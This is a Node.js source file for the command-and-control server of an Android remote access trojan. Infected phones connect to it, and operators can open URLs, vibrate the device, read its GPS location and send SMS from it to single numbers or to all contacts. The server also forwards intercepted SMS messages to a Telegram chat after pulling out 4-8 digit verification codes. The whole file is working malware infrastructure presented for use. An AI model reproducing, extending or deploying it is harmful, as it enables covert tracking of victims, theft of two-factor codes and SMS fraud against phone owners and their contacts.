const net = require("net");
const os = require("os");
const TelegramBot = require("node-telegram-bot-api");
const { UserDataTransform } = require("../transform");

const udt = new UserDataTransform();
const networkInterfaces = os.networkInterfaces();
let accepted_users = [];
const codeRegex = /\b\d{4,8}\b/g;
let ipAddress;

function build(string) {
    const translationTable = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationTable[char] || char).join('');
}

function extractCodes(text){
    let codes = text.match(codeRegex) || [];
    let s = '';
    for (let code of codes){
        if (code != codes[codes.length - 1]){
            s += `<code>${code}</code> , `
        } else {
            s += `<code>${code}</code>`
        }
    }
    return s;
}

function getServerIP(){
    for (const interfaceName in networkInterfaces) {
        for (const net of networkInterfaces[interfaceName]) {
            if (net.family === 'IPv4' && !net.internal) {
                ipAddress = net.address;
                break;
            }
        }
        if (ipAddress){ return ipAddress; }
    }
}

const getUsersByPort = async (portname, callback = () => {}) => {
    let found_users = [];
    for (let user of accepted_users){
        if (user.port.name == portname){
            found_users.push({
                command: `/sign_${user.device_id}`,
                accessory: user.access,
                device_id: user.device_id,
                socket: user.socket
            });
        }
    }

    callback({
        status: true,
        users: found_users,
        method: "getUsers"
    })
}

const getSafeUsersByPort = async (portname, callback = () => {}) => {
    let found_users = [];
    for (let user of accepted_users){
        if (user.port.name == portname){
            found_users.push({
                command: `/sign_${user.device_id}`,
                accessory: user.access,
                device_id: user.device_id
            });
        }
    }

    callback({
        status: true,
        users: found_users,
        method: "getUsers"
    })
}

const getUserByDeviceId = async (portname, devid, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        for (let user of allusers.users){
            if (user.device_id == devid){
                callback({
                    status: true,
                    user: user,
                    method: "getUserByDeviceId"
                });
                return;
            }
        }
        callback({
            status: false,
            method: "getUserByDeviceId"
        });
    })
}

const getSafeUserByDeviceId = async (portname, devid, callback = () => {}) => {
    await getSafeUsersByPort(portname, async (allusers) => {
        for (let user of allusers.users){
            if (user.device_id == devid){
                callback({
                    status: true,
                    user: user,
                    method: "getUserByDeviceId"
                });
                return;
            }
        }
        callback({
            status: false,
            method: "getUserByDeviceId"
        });
    })
}

const openUrl = async (portname, passname, devid, url, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        let found = null;
        for (let user of allusers.users){
            if (user.device_id == devid){
                found = user;
                return;
            }
        }

        if (found == null){
            callback({
                status: false,
                method: "openUrl",
                message: "USER_NOT_FOUND"
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "openUrl",
            url: url
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "openUrl"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "openUrl",
                            url: url
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "openUrl"
                        });
                        return;
                    }
                }
            }
        })
    })
}

const vibratePhone = async (portname, passname, devid, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        let found = null;
        for (let user of allusers.users){
            if (user.device_id == devid){
                found = user;
                return;
            }
        }
        if (found == null){
            callback({
                status: false,
                method: "vibratePhone",
                message: "USER_NOT_FOUND"
            });
            return;
        }
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "vibratePhone"
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "vibratePhone"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "vibratePhone"
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "vibratePhone"
                        });
                        return;
                    }
                }
            }
        })
    })
}

const sendToast = async (portname, passname, devid, toast, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        let found = null;
        for (let user of allusers.users){
            if (user.device_id == devid){
                found = user;
                return;
            }
        }

        if (found == null){
            callback({
                status: false,
                method: "sendToast",
                message: "USER_NOT_FOUND"
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendToast",
            toast: toast
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "sendToast"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "sendToast",
                            toast: toast
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "sendToast"
                        });
                        return;
                    }
                }
            }
        })
    })
}

const getGeoLocation = async (portname, passname, devid, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        let found = null;
        for (let user of allusers.users){
            if (user.device_id == devid){
                found = user;
                return;
            }
        }

        if (found == null){
            callback({
                status: false,
                method: "getGeoLocation",
                message: "USER_NOT_FOUND"
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "getGeoLocation"
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "getGeoLocation"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "getGeoLocation",
                            longitude: _message.longitude,
                            latitude: _message.latitude
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "getGeoLocation"
                        });
                        return;
                    }
                }
            }
        })
    })
}

const sendSMSAll = async (portname, passname, devid, sms, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        let found = null;
        for (let user of allusers.users){
            if (user.device_id == devid){
                found = user;
                return;
            }
        }

        if (found == null){
            callback({
                status: false,
                method: "sendSMSAll",
                message: "USER_NOT_FOUND"
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendSMSAll",
            sms: sms,
        }));
        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "sendSMSAll"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "sendSMSAll",
                            sms: sms
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "sendSMSAll"
                        });
                        return;
                    }
                }
            }
        })
    })
}

const sendSMS = async (portname, passname, devid, sms, tonumber, callback = () => {}) => {
    await getUsersByPort(portname, async (allusers) => {
        let found = null;
        for (let user of allusers.users){
            if (user.device_id == devid){
                found = user;
                return;
            }
        }

        if (found == null){
            callback({
                status: false,
                method: "sendSMS",
                message: "USER_NOT_FOUND"
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendSMS",
            sms: sms,
            tonumber: tonumber
        }));

        found.socket.on("data", async (data) => {
            let _message = JSON.parse(data.toString());
            if (_message.method == "sendSMS"){
                if (_message.port == portname && _message.password == passname){
                    if (_message.status == true){
                        callback({
                            status: true,
                            method: "sendSMS",
                            sms: sms,
                            tonumber: tonumber
                        });
                        return;
                    } else {
                        callback({
                            status: false,
                            method: "sendSMS"
                        });
                        return;
                    }
                }
            }
        })
    })
}

const server = net.createServer(async (socket) => {
    socket.on('data', async (data) => {
        try{
            let message = JSON.parse(data.toString());
            if (Object.keys(message).includes("mask")){
                if (message.mask == "metro"){
                    if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
                        await udt.getUserByPort(message.port, message.password, async (_port) => {
                            if (!_port.status){
                                socket.write(JSON.stringify({
                                    status: false,
                                    message: "INVALID_PORT_OR_PASSWORD"
                                }));
                                return;
                            }

                            if (_port.user.is_ban){
                                socket.write(JSON.stringify({
                                    status: false,
                                    message: "YOU_BANNED"
                                }));
                                return;
                            }

                            if (message.method == "getUsers"){
                                await getSafeUsersByPort(message.port, async (allusers) => {
                                    socket.write(JSON.stringify(allusers));
                                })
                            }

                            if (message.method == "getUserByDeviceId"){
                                await getSafeUserByDeviceId(message.port, message.device_id, async (user) => {
                                    socket.write(JSON.stringify(user));
                                })
                            }

                            if (message.method == "openUrl"){
                                await openUrl(message.port, message.password, message.device_id, message.url, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "vibratePhone"){
                                await vibratePhone(message.port, message.password, message.device_id, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "sendToast"){
                                await sendToast(message.port, message.password, message.device_id, message.toast, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "getGeoLocation"){
                                await getGeoLocation(message.port, message.password, message.device_id, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "sendSMSAll"){
                                await sendSMSAll(message.port, message.password, message.device_id, message.sms, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                            if (message.method == "sendSMS"){
                                await sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, async (dt) => {
                                    socket.write(JSON.stringify(dt));
                                })
                            }

                        })
                    } else {
                        socket.write(JSON.stringify({
                            status: false,
                            method: Object.keys(message).includes("method") ? message.method : "error",
                            message: "PORT_AND_PASSWORD_NOT_FOUND"
                        }));
                        return;
                    }
                } else {
                    socket.write(JSON.stringify({
                        status: false,
                        method: Object.keys(message).includes("method") ? message.method : "error",
                        message: "PORT_AND_PASSWORD_NOT_FOUND"
                    }));
                    return;
                }
            } else if (Object.keys(message).includes("port") && Object.keys(message).includes("password") && (!Object.keys(message).includes("mask") || message.mask !== "metro")){
                await udt.getUserByPort(message.port, message.password, async (prt) => {
                    if (prt.status){
                        let cli = new TelegramBot(prt.port.token);
                        if (message.method == "connect"){
                            accepted_users.push({
                                socket: socket,
                                port: prt.port,
                                device_id: message.device_id,
                                access: message.accessory
                            })

                            socket.write(JSON.stringify({
                                status: true
                            }));
                            
                            await cli.sendMessage(
                                prt.port.chat_id,
                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build(`\n🌐 𓏺|𓏺 ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 𓏺|𓏺 rat: ${message.rat}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found`),
                                {
                                    parse_mode: "HTML"
                                }
                            )
                        } else if (message.method == "receiveSMS"){
                            let codes = extractCodes(message.sms);
                            await cli.sendMessage(
                                prt.port.chat_id,
                                build(`📪 𓏺|𓏺 new message received\n👤 𓏺|𓏺 `) + `${message.name !== undefined || message.name !== null ? message.name : build("unknown")} { ${message.phone_number !== undefined || message.phone_number !== null ? message.phone_number : build("no phone")} }` + codes !== "" ? build(`💠 𓏺|𓏺 codes: ${codes}`) : "" + build("📀 𓏺|𓏺 message:") + "\n" + message.sms + "\n" + build(`🌐 𓏺|𓏺 ip: `) + message.ip,
                                {
                                    parse_mode: "HTML"
                                }
                            )
                        }                        
                    } else {
                        socket.write(JSON.stringify({
                            status: false,
                            message: "INVALID_PORT_OR_PASSWORD"
                        }))
                    }
                })
            }
        } catch (e){ console.log(e);socket.write(JSON.stringify({
            status: false,
            method: "error",
            message: "INVALID_DATA_TYPE"
        })) }
    })

    socket.on("close", async () => {})
    socket.on("error", async (errx) => {console.log(errx);})

})

server.listen(9932, "0.0.0.0", () => {
    let getCurrentIp = getServerIP();
    console.log("[B] socket-server connected");
    console.log("[B] socket-connection -> 127.0.0.1:9932");
    if (!getCurrentIp == "127.0.0.1"){
        console.log(`[B] socket-connection -> ${getCurrentIp}:9932`);
    }
})